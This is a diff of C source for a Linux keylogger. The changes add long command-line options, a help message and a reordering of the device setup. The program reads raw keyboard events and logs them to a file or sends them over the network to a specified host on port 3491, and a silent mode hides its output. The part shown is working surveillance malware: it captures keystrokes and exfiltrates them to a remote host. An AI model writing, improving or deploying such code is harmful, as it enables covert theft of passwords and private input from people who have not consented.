@@ -1,4 +1,6 @@
 #include <stdio.h>
+#include <stdbool.h>
+#include <getopt.h>
 #include <stdlib.h>
 #include <string.h>
 #include <errno.h>
@@ -12,47 +14,59 @@
 #define PORT "3491"
 
 void print_usage_and_quit(char *application_name);
+void print_help_and_quit(char *application_name);
 
 int main(int argc, char *argv[]){
-    char *KEYBOARD_DEVICE = get_keyboard_event_file();
-    if(!KEYBOARD_DEVICE){
-        print_usage_and_quit(argv[0]);
-    }
-
-    int writeout;
-    int keyboard;
-
-    int network = 0, file = 0, option = 0;
+    int writeout, option, keyboard, option_index = 0;
+    bool network, file;
     char *option_input;
-    while((option = getopt(argc, argv,"sn:f:")) != -1){
+    
+    option = 0;
+    network = file = false;
+    
+    static struct option long_options[] = {
+      {"silent",   no_argument,       0,  's'},
+      {"network",  required_argument, 0,  'n'},
+      {"file",     required_argument, 0,  'f'},
+      {"help",     no_argument,       0,  'h'},
+      {0,          0,                 0,   0 }
+    };
+    
+    while((option = getopt_long(argc, argv,"sn:f:", long_options, &option_index)) != -1)
+      {
         switch(option){
             case 's':
                 freopen("/dev/null", "w", stdout);
                 freopen("/dev/null", "w", stderr);
                 break;
             case 'n':
-                network = 1;
+                network = true;
                 option_input = optarg;
                 break;
             case 'f':
-                file = 1;
+                file = true;
                 option_input = optarg;
                 break;
+	    case 'h':
+	        print_help_and_quit(argv[0]);
+	        break;
             default: print_usage_and_quit(argv[0]);
         }
     }
 
-    // If both arguments or neither are provided...
+    // XNOR, If both arguments or neither are provided...
     if(network == file){
         print_usage_and_quit(argv[0]);
     }
-    else if(file){
+    
+    if(file){
         if((writeout = open(option_input, O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0){
             printf("Error opening file %s: %s\n", argv[2], strerror(errno));
             return 1;
         }
     }
-    else if(network){
+    
+    if(network){
         writeout = get_socket_file_descriptor(option_input, PORT);
         if(writeout < 0){
             printf("Error creating socket on %s\n", option_input);
@@ -60,14 +74,18 @@ int main(int argc, char *argv[]){
         }
     }
 
+    char *KEYBOARD_DEVICE = get_keyboard_event_file();
+    if(!KEYBOARD_DEVICE){
+        print_usage_and_quit(argv[0]);
+    }
+
     if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
         printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
         return 1;
     }
 
-
     keylogger(keyboard, writeout);
-
+    
     close(keyboard);
     close(writeout);
     free(KEYBOARD_DEVICE);
@@ -75,7 +93,18 @@ int main(int argc, char *argv[]){
     return 0;
 }
 
+void print_help_and_quit(char *application_name){
+    printf("Usage: %s [OPTION]... \n", application_name);
+    fputs("\
+Log keys on a Linux system to a file or specified host.\n\
+  -s         --silent          do not log keys to terminal\n\
+  -n host    --network host    log keys to specified host\n\
+  -f outfile --file outfile    log keys to specified file\n\
+", stdout);
+    exit(1);
+}
+
 void print_usage_and_quit(char *application_name){
-    printf("Usage: %s [-s] [-n ip-address | -f output-file]\n", application_name);
+    printf("Try: '%s --help' for more information.\n", application_name);
     exit(1);
 }
